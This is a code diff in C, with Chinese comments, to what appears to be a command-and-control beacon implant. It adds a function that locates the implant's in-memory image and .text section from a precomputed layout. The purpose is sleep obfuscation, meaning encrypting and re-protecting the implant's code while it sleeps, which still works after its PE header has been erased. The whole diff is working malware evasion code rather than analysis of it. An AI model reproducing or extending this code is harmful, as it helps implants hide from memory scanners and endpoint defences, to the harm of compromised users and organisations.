@@ -77,6 +77,36 @@ static DWORD SleepObfEstimatedOverhead(VOID)
     return SLEEP_OBF_SETUP_BUDGET + SLEEP_OBF_TIMER_STAGE_COUNT * SLEEP_OBF_TIMER_STEP_MS;
 }
 
+/* 优先使用 profile patch 中的预计算 layout，避免依赖已被清理的 PE header */
+static BOOL SleepObfFindImageRegionsByLayout(BeaconContext* ctx, SleepObfImageRegions* regions)
+{
+    const SleepObfImageLayout* layout;
+    BYTE* base;
+    BYTE* anchor;
+
+    if (!ctx || !regions || !ctx->image_base) return FALSE;
+
+    layout = &ctx->profile.sleep_layout;
+    if (!layout->valid || layout->image_size == 0 || layout->text_size == 0 ||
+        layout->text_rva >= layout->image_size ||
+        layout->text_size > layout->image_size - layout->text_rva) {
+        return FALSE;
+    }
+
+    base = (BYTE*)ctx->image_base;
+    anchor = (BYTE*)&SleepObfFindImageRegionsByLayout;
+    if (anchor < base || anchor >= base + layout->image_size) {
+        return FALSE;
+    }
+
+    regions->image.base = base;
+    regions->image.size = (SIZE_T)layout->image_size;
+    regions->text.base = base + layout->text_rva;
+    regions->text.size = (SIZE_T)layout->text_size;
+    regions->restore_protect = layout->text_protect ? layout->text_protect : PAGE_EXECUTE_READ;
+    return TRUE;
+}
+
 /* 定位当前模块整体映像和 .text 区域，供后续加密/恢复保护使用 */
 static BOOL SleepObfFindImageRegions(BeaconContext* ctx, SleepObfImageRegions* regions)
 {
@@ -88,6 +118,10 @@ static BOOL SleepObfFindImageRegions(BeaconContext* ctx, SleepObfImageRegions* r
 
     if (!ctx || !regions) return FALSE;
     ZeroMemory(regions, sizeof(*regions));
+
+    if (SleepObfFindImageRegionsByLayout(ctx, regions)) {
+        return TRUE;
+    }
 
     module = (HMODULE)ctx->image_base;
     if (!module) {
